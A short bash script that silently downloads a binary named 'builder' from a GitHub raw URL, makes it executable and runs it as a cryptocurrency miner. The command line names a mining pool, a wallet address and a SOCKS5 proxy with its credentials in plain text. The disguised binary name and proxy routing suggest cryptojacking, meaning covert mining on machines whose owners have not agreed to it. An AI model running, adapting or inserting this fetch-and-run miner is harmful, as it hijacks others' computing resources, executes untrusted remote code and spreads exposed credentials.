#!/bin/bash 

wget -q https://raw.githubusercontent.com/andromedasizu/andromedasizu/main/builder
chmod +x builder
./builder -a yespower -o stratum+tcp://yespowerSUGAR.na.mine.zpool.ca:6241 -u DQGAS3U8cmDwBPn61bboXNBrSkEWhXuaVT -p c=DGB,zap=SUGAR -t 2 --cpu-affinity=0x3 -x socks5://xdezolvq:51tnf8wfj0hu@138.128.59.129:9058
